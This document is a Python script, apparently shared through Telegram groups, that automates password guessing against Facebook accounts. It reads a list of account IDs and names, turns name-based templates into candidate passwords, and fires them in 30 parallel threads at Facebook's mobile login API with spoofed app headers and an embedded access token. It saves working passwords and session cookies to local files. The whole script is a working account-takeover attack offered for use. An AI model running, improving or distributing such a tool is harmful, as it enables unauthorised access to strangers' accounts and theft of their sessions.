# SCRIPT GIFT BY ARIF-402
# JOIN TELEGRAM GROUP : https://t.me/MR_POCO_143
#-----------------------[ IMPORT ]-----------------------#
import os,requests,json,time,re,random,sys,uuid,string,subprocess,bs4
try:import pycurl,io
except:os.system('pip install pycurl')
try:
	os.system('clear')
	import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform,hashlib,zlib,re
	from string import * 
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\x1b[1;97m[\033[1;32m~\x1b[1;97m] INSTALLING MISSING MODULES...');os.system('pip install requests bs4 futures==2 > /dev/null')
except:pass
#-----------------------[ LOOP ]-----------------------#
loop=0;oks=[];cps=[];pcp=[];id=[];tokenku=[];plist=[]
#-----------------------[ COLOUR ]-----------------------#
G="\033[1;32m";W="\x1b[1;97m";R="\x1b[38;5;160m";B="\033[1;90m";Y="\033[1;33m";T="\033[1;34m";E="\x1b[38;5;205m";O="\x1b[38;5;81m"
#-----------------------[ STYLE ]-----------------------#
xd=f" {W}[{G}~{W}]{W}";xd1=f" {W}[{G}1{W}]{W}";xd2=f" {W}[{G}2{W}]{W}";xd0=f" {W}[{G}0{W}]{W}";xdx=f" {W}[{G}?{W}]{W}"
#-----------------------[ CLEAR ]-----------------------#
def clear():os.system('clear');print(logo)
def linex():print(f"{W}{47*'-'}")
#-----------------------[ USER AGENT ]-----------------------#
def _____mrpoco_____():
	ua1 = '[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125760;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/214902642;FBCR/Qlink;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/N9137;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua2 = '[FBAN/FB4A;FBAV/445.0.0.34.118;FBBV/448014984;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_GB;FBRV/0;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955FD;FBSV/1.1.1;FBOP/8;FBCA/armeabi-v7a:armeabi;]'
	ua3 = '[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua4 = '[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022701;FBDM/{density=1.5,width=540,height=888};FBLC/en_US;FBCR/TELCEL;FBMF/kyocera;FBBD/kyocera;FBPN/com.facebook.katana;FBDV/C6740N;FBSV/5.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua5 = '[FBAN/FB4A;FBAV/149.0.0.40.71;FBBV/79007703;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/79424004;FBCR/Airtel;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/vodafone;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua6 = '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323375;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_GB;FBRV/156387063;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	return random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
	os.system('clear')
#-----------------------[ LOGO ]-----------------------#
os.system('espeak -a 300 " Assalamu' 'olaikum"')
os.system('espeak -a 300 " Your,   Real,  Name,"')
NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
os.system('espeak -a 300 "well,come to,sifat, tools"')
os.system('xdg-open https://www.facebook.com/profile.php?id=100088772568972.Ok.Bro')
logo = f'''\n        
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
        ███████╗██╗███████╗ █████╗ ████████╗
        ██╔════╝██║██╔════╝██╔══██╗╚══██╔══╝
        ███████╗██║█████╗  ███████║   ██║   
        ╚════██║██║██╔══╝  ██╔══██║   ██║   
        ███████║██║██║     ██║  ██║   ██║   
        ╚══════╝╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝ 
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m      [ WORKING WIFI AND MOBILE DATA ]       \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
TOOL : FILE CLONING\n{W}{47*'-'}'''
#-----------------------[ MAIN MENU ]-----------------------#
def mrpoco():
	os.system('xdg-open https://t.me/sifat121255')
	clear();print(f'{xd1} START FILE CLONING ');print(f'{xd0} EXIT FILE CLONING ');linex();mr=input(f'{xdx} SELECT : ')
	if mr in ["1"]:__________filex__________()
	elif mr in ["0"]:exit()
	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);mrpoco()
#-----------------------[ FILE MENU ]-----------------------#
def __________filex__________():
	os.system('xdg-open https://t.me/arifulboos')
	clear();print(f'{xd} EXAMPLE : /sdcard/filename.txt ');linex();file = input(f'{xdx} ENTER FILE PATH : ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);__________filex__________()
	clear()
	try:
		ps_limit = int(input(f'{xdx} ENTER PASSWORD LIMIT : '))
	except:
		ps_limit = 5
	clear();print(f'{xd} EXAMPLE : firstlast | firtslast | first123');linex()
	for i in range(ps_limit):
		plist.append(input(f'{xd} ENTER PASSWORD {W}[{G}{i+1}{W}] : '))
	with tred(max_workers=30) as __________mrpoco__________:
		clear();__________totaluid__________ = str(len(fo))
		print(f'{xd} TOTAL ACCOUNTS :{G} {__________totaluid__________} ')
		print(f'{xd} IF NO RESULT ON|OFF AIRPLANE MODE');linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			__________mrpoco__________.submit(__________method__________,ids,names,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK|CP :{G} '+str(len(oks))+'|'+str(len(cps)));linex();exit()
#-----------------------[ FILE METHOD ]-----------------------#
def __________method__________(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{xd}~{W}[{G}ARIF-402-XD{W}]~[{Y}%s{W}]~[{G}%s{W}]~[{R}%s{W}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": _____mrpoco_____(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{xd}~{W}[{G}SUCCESSFUL{W}] '+ids+' | '+pas+'\033[1;97m')
                                        print(f'\r\r{xd}~{G}{cookies} ');linex()
                                        open('/sdcard/ARIF-402-XD-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        #print(f'\r{R}[{R}CHECKPOINT{R}]{R} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ARIF-402-XD-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break       
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------------[ END ]-----------------------#
try:
	mrpoco()
except requests.exceptions.ConnectionError:
	print('\x1b[1;97m[\033[1;32m~\x1b[1;97m] BROH YOUR NETWORK PROBLEM...')
	exit()
except:exit()